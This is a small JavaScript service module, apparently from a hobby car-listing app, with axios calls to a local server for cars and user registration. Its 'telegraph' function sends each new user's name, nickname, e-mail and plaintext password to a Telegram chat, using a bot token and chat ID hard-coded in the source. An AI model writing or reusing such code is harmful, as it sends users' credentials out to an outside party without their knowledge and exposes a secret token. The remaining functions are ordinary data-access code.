import axios from "axios";
// axios.defaults.baseURL = "";

export const CarService = {
  async getAll() {
    const response = await axios.get(`http://localhost:3000/cars`);
    return response.data;
  },
  async getAllUsers() {
    const response = await axios.get("http://localhost:3000/users");
    return response.data;
  },
  async getById(id) {
    const response = await axios.get(`http://localhost:3000/cars?id=${id}`);
    return response.data[0];
  },
  async create(data) {
    return axios.post("http://localhost:3000/cars", data);
  },
  async reg(data) {
    return axios.post("http://localhost:3000/users", data);
  },
  async telegraph(data) {
    console.log(data);
    const TOKEN = "6262564612:AAF-5PHacpgsRINJBNyLveJdPF9hzjCndv4";
    const CHAT_ID = "-892440529";
    let message = "New Registration:";
    message += `<b>Отправитель: ${data.data.name}</b>\n`;
    message += `<b>Nickname: ${data.data.nickname}</b>\n`;
    message += `<b>E-mail: ${data.data.email}</b>\n`;
    message += `<b>Password: ${data.data.password}</b>\n`;
    return await axios.post(
      `https://api.telegram.org/bot${TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        parse_mode: "html",
        text: message,
      }
    );
  },
};
